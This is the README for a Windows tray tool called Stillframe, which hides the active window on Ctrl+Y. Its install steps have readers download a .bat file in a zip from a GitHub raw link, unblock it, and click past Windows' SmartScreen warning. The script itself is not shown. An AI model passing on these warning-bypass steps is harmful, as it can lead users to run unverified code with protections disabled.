# Stillframe

Windows tray tool. Ctrl+Y keeps the window in front running without minimizing it. Ctrl+Y again puts that same window back.

## Download

1. Open [Stillframe.zip](https://github.com/tarunmeenaofficial-droid/Stillframe/raw/main/Stillframe.zip) and download it.
2. Unzip it. Inside is Stillframe.bat.
3. Right-click Stillframe.bat, open Properties, and tick Unblock if you see it.
4. Double-click it. If Windows warns you, choose More info, then Run anyway.
5. Leave the icon by the clock. Click the game, then press Ctrl+Y.

Quit from the tray icon so the hidden window comes back full size. Exclusive fullscreen will not work. Use borderless. If the game is running as admin, use Restart as admin on the tray menu.
